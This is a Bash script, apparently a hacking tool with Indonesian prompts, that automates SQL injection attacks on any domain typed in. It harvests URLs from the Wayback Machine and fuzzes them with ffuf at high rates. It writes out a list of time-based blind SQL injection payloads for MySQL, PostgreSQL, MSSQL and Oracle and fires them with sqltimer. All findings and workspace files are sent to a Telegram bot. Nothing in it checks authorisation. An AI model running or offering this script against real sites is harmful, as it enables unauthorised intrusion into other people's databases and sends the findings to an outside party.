#!/bin/bash

# Colors
MAGENTA='\033[1;35m'
NC='\033[0m' # No Color
BLUE='\033[1;34m'
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'

# Progress bar configuration
BAR_WIDTH=50
BAR_CHAR_DONE="#"
BAR_CHAR_TODO="-"
BRACKET_DONE="["
BRACKET_TODO="]"

# Progress bar function
display_progress() {
    local current=$1
    local total=$2
    local title=$3
    local percent=$((current * 100 / total))
    local done=$((percent * BAR_WIDTH / 100))
    local todo=$((BAR_WIDTH - done))

    printf "\r${YELLOW}[*] %s: ${BRACKET_DONE}" "${title}"
    printf "%${done}s" | tr " " "${BAR_CHAR_DONE}"
    printf "%${todo}s${BRACKET_TODO} %3d%%" | tr " " "${BAR_CHAR_TODO}"
    echo -en " ($current/$total)${NC}"
}

# Banner function
display_banner() {
    clear
    echo -e "${BLUE}"
    figlet -w 100 -f small "Single Auto SQL Injection"
    echo -e "${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Input target function
input_target() {
    clear
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║          Single Auto SQL Injection          ${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}\n"
    
    while true; do
        echo -e "${YELLOW}[?] Masukkan domain target ${NC}(contoh: example.com)"
        echo -e "${YELLOW}[?] Ketik 'quit' untuk keluar${NC}"
        echo -ne "\n${GREEN}[+] Target Domain: ${NC}"
        read -r input
        
        # Validasi input
        if [[ -z "$input" ]]; then
            echo -e "\n${RED}[!] Error: Domain tidak boleh kosong!${NC}"
            sleep 1
            continue
        elif [[ "$input" == "quit" ]]; then
            echo -e "\n${YELLOW}[!] Keluar dari program...${NC}"
            exit 0
        elif ! [[ "$input" =~ ^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
            echo -e "\n${RED}[!] Error: Format domain tidak valid!${NC}"
            sleep 1
            continue
        fi
        
        # Jika validasi berhasil
        echo -e "\n${GREEN}[✓] Domain target valid: $input${NC}"
        echo -e "${BLUE}[*] Memulai pemindaian...${NC}\n"
        sleep 1
        domain="$input"  # Set domain variable
        workspace="$input"  # Set workspace variable
        break
    done
    return 0
}

# Setup workspace
setup_workspace() {
    echo -e "\n${BLUE}[+] Setting up workspace...${NC}"
    mkdir -p "$workspace"/{sources,result/{sqli,wayback,gf}}
    echo -e "${GREEN}[✓] Workspace created${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# WAF detection
check_waf() {
    echo -e "\n${BLUE}[+] Checking Web Application Firewall...${NC}"
    if command -v wafw00f &> /dev/null; then
        wafw00f "$domain" | tee "$workspace/result/waf_detection.txt"
    else
        echo -e "${YELLOW}[!] wafw00f not found - performing basic WAF check${NC}"
        curl -sI "https://$domain" | grep -i "WAF" | tee "$workspace/result/waf_detection.txt"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Wayback data collection
collect_wayback() {
    echo -e "\n${BLUE}[+] Collecting URLs from Wayback Machine...${NC}"
    
    if command -v waybackurls &> /dev/null; then
        echo "https://$domain/" | waybackurls | anew "$workspace/result/wayback/wayback-tmp.txt"
        
        echo -e "${MAGENTA}[*] Filtering relevant URLs...${NC}"
        cat "$workspace/result/wayback/wayback-tmp.txt" 2>/dev/null | \
            egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpeg|\.jpg|\.png|\.css|\.ico" | \
            sed 's/:80//g;s/:443//g' | sort -u > "$workspace/result/wayback/wayback.txt"
        
        rm -f "$workspace/result/wayback/wayback-tmp.txt"
        total_urls=$(wc -l < "$workspace/result/wayback/wayback.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $total_urls unique URLs${NC}"
    else
        echo -e "${RED}[!] waybackurls not found${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# URL validation
validate_urls() {
    echo -e "\n${BLUE}[+] Validating discovered URLs...${NC}"
    if [[ -f "$workspace/result/wayback/wayback.txt" ]]; then
        ffuf -c -u "FUZZ" -w "$workspace/result/wayback/wayback.txt" -of csv -o "$workspace/result/wayback/valid-tmp.txt" \
             -t 100 -rate 1000
        
        cat "$workspace/result/wayback/valid-tmp.txt" 2>/dev/null | grep http | awk -F "," '{print $1}' > "$workspace/result/wayback/valid.txt"
        rm -f "$workspace/result/wayback/valid-tmp.txt"
        
        valid_count=$(wc -l < "$workspace/result/wayback/valid.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $valid_count valid URLs${NC}"
    else
        echo -e "${RED}[!] No URLs found to validate${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# GF pattern matching
run_gf_patterns() {
    echo -e "\n${BLUE}[+] Running GF pattern matching...${NC}"
    
    if ! command -v gf &> /dev/null; then
        echo -e "${RED}[!] gf not found${NC}"
        return 1
    fi
    
    patterns=("sqli" "reflection" "debug_logic" "interestingparams")
    total_patterns=${#patterns[@]}
    current=0
    
    for pattern in "${patterns[@]}"; do
        ((current++))
        echo -e "${MAGENTA}[*] ($current/$total_patterns) Checking for $pattern patterns...${NC}"
        gf "$pattern" "$workspace/result/wayback/valid.txt" 2>/dev/null | tee "$workspace/result/gf/${pattern}.txt"
        count=$(wc -l < "$workspace/result/gf/${pattern}.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $count potential $pattern endpoints${NC}"
    done
    
    echo -e "${GREEN}[✓] Pattern matching completed${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# SQL injection testing
test_sqli() {
    echo -e "\n${BLUE}[+] Testing for SQL injection vulnerabilities...${NC}"
    
    # Check if sqltimer is installed
    if ! command -v sqltimer &> /dev/null; then
        echo -e "${RED}[!] sqltimer not found. Please install it first.${NC}"
        echo -e "${YELLOW}[*] You can install it with: go install github.com/c0dejump/sqltimer@latest${NC}"
        return 1
    fi
    
    # Check if SQL injection patterns file exists
    if [[ ! -f "$workspace/result/gf/sqli.txt" ]] || [[ ! -s "$workspace/result/gf/sqli.txt" ]]; then
        echo -e "${RED}[!] No SQL injection patterns found to test${NC}"
        return 1
    fi
    
    # Check for payloads file
    payloads_file="payloads.txt"
    if [[ ! -f "$payloads_file" ]]; then
        echo -e "${YELLOW}[!] Payloads file not found at $payloads_file${NC}"
        echo -e "${BLUE}[*] Creating basic payloads file...${NC}"
        cat > "$payloads_file" << 'EOF'
1') AND SLEEP({SLEEP}) AND ('1'='1
(select*from(select(sleep({SLEEP})))a)
(SELECT*SLEEP({SLEEP}))
SLEEP({SLEEP})
1337ANDSLEEP({SLEEP})
'AND(CASEWHEN(SUBSTRING(version(),1,1)='P')THEN(SELECT4564FROMPG_SLEEP({SLEEP}))ELSE4564END)=4564--
';WAITFORDELAY'00:00:{SLEEP}'--
';IF(1=1)WAITFORDELAY'00:00:{SLEEP}'--
'||DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})--
'XOR(IF(NOW()=SYSDATE(),SLEEP({SLEEP}),0))XOR'Z
'OR1=(SELECTCASEWHEN(1=1)THENPG_SLEEP({SLEEP})ELSENULLEND)--
EOF
    fi
    
    # Count total URLs to test
    total_urls=$(wc -l < "$workspace/result/gf/sqli.txt")
    echo -e "${MAGENTA}[*] Testing $total_urls potential SQL injection endpoints...${NC}"
    
    # Run SQL injection testing
    cat "$workspace/result/gf/sqli.txt" | sqltimer -payloads "$payloads_file" -sleep 10 -threads 20 -encode 2>/dev/null | tee "$workspace/result/sqli/vulnerable.txt"
    
    # Check results
    if [[ -f "$workspace/result/sqli/vulnerable.txt" ]]; then
        vuln_count=$(grep -c "VULNERABLE" "$workspace/result/sqli/vulnerable.txt" 2>/dev/null || echo "0")
        if [[ $vuln_count -gt 0 ]]; then
            echo -e "${RED}[!] Found $vuln_count potential SQL injection vulnerabilities!${NC}"
        else
            echo -e "${GREEN}[✓] No SQL injection vulnerabilities detected${NC}"
        fi
    else
        echo -e "${YELLOW}[!] No results generated${NC}"
    fi
    
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Send results to Telegram
send_to_telegram() {
    if [[ -f telegram_token.txt && -f telegram_chat_id.txt ]]; then
        echo -e "\n${BLUE}[+] Sending results to Telegram...${NC}"
        
        token=$(cat telegram_token.txt)
        chat_id=$(cat telegram_chat_id.txt)
        
        message="🔍 SQL Injection scan completed for: $domain
📊 Summary:
• Total URLs: $(wc -l < "$workspace/result/wayback/wayback.txt" 2>/dev/null || echo "0")
• Valid URLs: $(wc -l < "$workspace/result/wayback/valid.txt" 2>/dev/null || echo "0")
• SQL Injectable URLs: $(wc -l < "$workspace/result/sqli/vulnerable.txt" 2>/dev/null || echo "0")
📤 Sending detailed results..."

        curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" \
             -d chat_id="$chat_id" \
             -d text="$message" > /dev/null 2>&1

        # Send files with progress tracking
        total_files=$(find "$workspace" -type f | wc -l)
        current=0
        
        find "$workspace" -type f | while read -r file; do
            ((current++))
            echo -e "${MAGENTA}[*] Sending file ($current/$total_files): $(basename "$file")${NC}"
            curl -s -F chat_id="$chat_id" \
                 -F document=@"$file" \
                 "https://api.telegram.org/bot$token/sendDocument" > /dev/null 2>&1
        done

        echo -e "${GREEN}[✓] Results sent to Telegram${NC}"
    else
        echo -e "${RED}[!] Telegram credentials not found${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Main execution
main() {
    display_banner
    input_target
    setup_workspace
    check_waf
    collect_wayback
    validate_urls
    run_gf_patterns
    test_sqli
    send_to_telegram
    echo -e "\n${GREEN}[✓] SQL Injection scan completed successfully!${NC}\n"
}

# Run the script
main
